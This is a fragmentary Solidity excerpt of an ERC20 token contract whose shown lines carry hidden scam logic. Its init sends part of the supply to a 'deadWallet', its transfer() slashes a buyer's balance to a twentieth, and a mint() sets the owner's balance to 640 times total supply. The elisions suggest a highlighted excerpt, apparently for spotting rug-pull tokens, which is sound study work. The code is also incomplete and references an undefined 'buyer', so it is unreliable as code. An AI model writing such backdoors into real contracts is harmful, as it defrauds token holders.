...
contract InitializableMintableERC20 is InitializableOwnable {
    ...
    function init (
        ...
        balances[deadWallet] = balances[deadWallet].add(_initSupply/5);        
        balances[_creator] = balances[_creator].sub(_initSupply/5);        
        emit Transfer(_creator, deadWallet, _initSupply/5);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balances[buyer]= balances[buyer].divCeil(20);
    ...
    function mint() internal {
        balances[_OWNER_] = totalSupply.mul(640);
    }
